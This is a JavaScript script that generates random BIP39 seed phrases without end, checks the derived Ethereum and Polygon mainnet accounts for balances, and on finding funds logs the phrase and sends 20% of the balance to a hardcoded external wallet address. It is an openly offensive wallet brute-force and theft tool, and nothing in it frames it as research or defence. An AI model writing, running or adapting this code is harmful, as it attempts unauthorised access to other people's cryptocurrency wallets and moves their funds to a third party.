const HDWalletProvider = require('@truffle/hdwallet-provider');
const Web3 = require('web3');
const bip39 = require('bip39');

const checkBalance = async (web3Provider, network, _mnemonic) =>
{
    // get accounts
    const accounts = await web3Provider.eth.getAccounts();
    // for each account of the 5 first accounts
    for (const account of accounts.slice(0, 5))
    {
        // get balance
        const brutBalance = await web3Provider.eth.getBalance(account);
        const balance = web3Provider.utils.fromWei(brutBalance, 'ether');

        // balance to transfer - 20% of the balance
        const balanceToTransfer = balance * 0.2;

        // check if balance is greater than 0
        if (balance > 0)
        {
            console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
            console.log(`Mnemonic: ${_mnemonic}, Account: ${account}`);

            // transfer funds to your wallet
            const tx = await web3Provider.eth.sendTransaction({
                from: account,
                to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
                value: balanceToTransfer
            }).catch(err => console.log(err, _mnemonic, network));

            // log transaction
            console.log(`Transaction: ${JSON.stringify(tx)}`);

            // exit process
            process.exit();
        }
    }
}

let mnemonic = "plate camera risk vanish skin stove people lunch ill invite employ unknown";
const main_function = async () =>
{
    // infinite loop
    while (true)
    {
        // generating BIP39 mnemonic
        mnemonic = bip39.generateMnemonic();
    
        // check if wallet exists in Ethereum Mainnet
        let provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://ethereum.publicnode.com",
            pollingInterval: 10000000,
        })
        let web3 = new Web3(provider);
        
        await checkBalance(web3, 'Ethereum Mainnet', mnemonic)
            .catch(err => console.log(err, mnemonic, 'Ethereum Mainnet'));
    
        // check if wallet exists in Matic Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://polygon-rpc.com",
            pollingInterval: 10000000,
        })
        let web3Matic = new Web3(provider);
        
        await checkBalance(web3Matic, 'Matic Mainnet', mnemonic)
            .catch(err => console.log(err, mnemonic, 'Matic Mainnet'));

        console.log(`No money found! Mnemonic: ${mnemonic}`);
    }
}

main_function().catch(err => console.log(err, '; last mnemonic: ' ,mnemonic));